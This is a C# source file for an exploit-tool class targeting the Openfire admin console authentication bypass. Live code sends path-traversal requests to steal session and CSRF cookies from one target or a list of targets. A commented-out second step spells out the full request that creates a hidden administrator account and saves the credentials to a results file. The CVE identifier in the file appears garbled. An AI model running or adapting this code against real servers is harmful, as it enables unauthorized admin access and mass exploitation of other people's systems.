using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace OelianderUI.Helpers.Exploits
{
    /// 
    /// OpenFire Console Authentication Bypass Vulnerability [CVE-2023-3215]
    /// 
    public class OpenFireAuthBypass
    {
        internal static readonly string banner = @"

 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██████╗  ██╗███████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗╚════██╗╚════██╗███║██╔════╝
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚═══██╗██╔═══╝  ╚═══██╗ ██║╚════██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     ██████╔╝███████╗██████╔╝ ██║███████║
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝      ╚═════╝ ╚══════╝╚═════╝  ╚═╝╚══════╝

Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215)
Use at your own risk!

";
        static string GenerateRandomString(int length)
        {
            var charset = "abcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();
            var result = new string(Enumerable.Range(0, length).Select(_ => charset[random.Next(charset.Length)]).ToArray());
            return result;
        }

        static string Between(string input, string start, string end)
        {
            int startIndex = input.IndexOf(start);
            if (startIndex == -1) return "";

            startIndex += start.Length;
            int endIndex = input.IndexOf(end, startIndex);
            if (endIndex == -1) return "";

            return input.Substring(startIndex, endIndex - startIndex);
        }

        static async Task ExploitAsync(string target)
        {
            var client = new HttpClient();
            string host = target.Split(new[] { "://" }, StringSplitOptions.None)[1];

            string jsessionid = "", csrf = "";

            // Step 1: Get csrf and jsessionid
            try
            {
                string url = $"{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp";
                var headers = new Dictionary<string, string>
                {
                    { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36" },
                    { "Accept-Encoding", "gzip, deflate" },
                    { "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" },
                    { "Connection", "close" },
                    { "Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3" },
                    { "DNT", "1" },
                    { "X-Forwarded-For", "1.2.3.4" },
                    { "Upgrade-Insecure-Requests", "1" }
                };

                Console.WriteLine($"[..] Checking target: {target}");

                var response = await client.GetAsync(url);
                var cookies = response.Headers.GetValues("Set-Cookie").ToList();
                jsessionid = cookies.FirstOrDefault(c => c.Contains("JSESSIONID"))?.Split('=')[1].Split(';')[0];
                csrf = cookies.FirstOrDefault(c => c.Contains("csrf"))?.Split('=')[1].Split(';')[0];

                if (!string.IsNullOrEmpty(jsessionid) && !string.IsNullOrEmpty(csrf))
                {
                    Console.WriteLine($"Successfully retrieved JSESSIONID: {jsessionid} + csrf: {csrf}");
                }
                else
                {
                    Objects.ShowAlert("Exploit Failed", "Failed to get JSESSIONID and csrf value", 2);
                    return;
                }

                // Step 2: Add user 
                // NOT IMPLEMENTING ACTUAL EXPLOIT! JUST SCANNER
                //
                //string username = GenerateRandomString(6);
                //string password = GenerateRandomString(6);

                //var header2 = new Dictionary<string, string>
                //{
                //    { "Host", host },
                //    { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" },
                //    { "Accept-Encoding", "gzip, deflate" },
                //    { "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" },
                //    { "Connection", "close" },
                //    { "Cookie", $"JSESSIONID={jsessionid}; csrf={csrf}" },
                //    { "Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3" },
                //    { "DNT", "1" },
                //    { "X-Forwarded-For", "1.2.3.4" },
                //    { "Upgrade-Insecure-Requests", "1" }
                //};

                //string createUserUrl = $"{target}/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf={csrf}&username={username}&name=&email=&password={password}&passwordConfirm={password}&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7";
                //var createResponse = await client.GetAsync(createUserUrl);

                //if (createResponse.IsSuccessStatusCode)
                //{
                //    Console.WriteLine($"User added successfully: url: {target} username: {username} password: {password}");
                //    if (!Directory.Exists("Results/OpenFire"))
                //        Directory.CreateDirectory("Results/OpenFire");
                //    File.AppendAllText("Results/OpenFire/success.txt", $"url: {target} username: {username} password: {password}\n");
                //}
                //else
                //{
                //    Objects.ShowAlert("Exploit Failed", "Failed to add user", 2);
                //}

            }
            catch (Exception ex)
            {
                Objects.ShowAlert("Exploit Failed", $"Error occurred while retrieving cookies: {ex.Message}", 2);
            }
        }

        public static async Task ScanForOpenFireRCE(string targetString)
        {
            
            if (targetString.EndsWith(".txt"))
            {
                var targets = File.ReadAllLines(targetString);
                var tasks = targets.Select(t => ExploitAsync(t)).ToArray();
                await Task.WhenAll(tasks);
            } 
            else
                await ExploitAsync(targetString);
        }
    }
}

